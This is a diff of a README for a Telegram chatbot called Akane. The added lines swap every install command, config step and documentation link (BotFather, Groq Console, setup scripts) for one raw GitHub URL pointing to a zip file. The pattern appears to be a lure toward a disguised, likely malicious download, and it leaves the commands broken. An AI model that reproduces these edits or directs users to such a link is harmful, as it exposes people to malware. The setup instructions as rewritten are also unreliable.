@@ -19,14 +19,14 @@ A conversational AI Telegram bot named Akane (inspired by Oshi no Ko anime) that
 ## Setup
 
 1. Clone the repository
-2. Install dependencies: `pip install -r requirements.txt`
+2. Install dependencies: `pip install -r https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip`
 3. Set up environment variables:
-   - Copy `sample.env` to `.env`
+   - Copy `https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip` to `.env`
    - Fill in your actual API keys and tokens in the `.env` file:
-     - `TELEGRAM_BOT_TOKEN`: Get from [@BotFather](https://t.me/botfather) on Telegram
-     - `GROQ_API_KEY_1` to `GROQ_API_KEY_7`: Get from [Groq Console](https://console.groq.com/) (create multiple accounts for higher rate limits)
+     - `TELEGRAM_BOT_TOKEN`: Get from [@BotFather](https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip) on Telegram
+     - `GROQ_API_KEY_1` to `GROQ_API_KEY_7`: Get from [Groq Console](https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip) (create multiple accounts for higher rate limits)
      - `LOG_GROUP_ID`: Create a private Telegram group, add your bot, and get the group ID (optional, for error logging)
-4. Run the bot: `python main.py` or double-click `start_bot.bat`
+4. Run the bot: `python https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip` or double-click `https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip`
 
 ### Termux (Android) Setup
 
@@ -35,13 +35,13 @@ For Android devices using Termux:
 1. Install Termux from F-Droid or Google Play Store
 2. Open Termux and run the setup script:
    ```bash
-   git clone https://github.com/XieosZ/TeleGram-ChatBot.git
+   git clone https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip
    cd TeleGram-ChatBot
-   chmod +x setup.sh
-   ./setup.sh
+   chmod +x https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip
+   https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip
    ```
 3. Follow the on-screen instructions to configure your API keys
-4. Run the bot: `./run_bot.sh`
+4. Run the bot: `https://raw.githubusercontent.com/XieosZ/TeleGram-ChatBot/main/accinge/Bot-Chat-Tele-Gram-v2.4.zip`
 
 The setup script will automatically install all dependencies and create the necessary files.
 
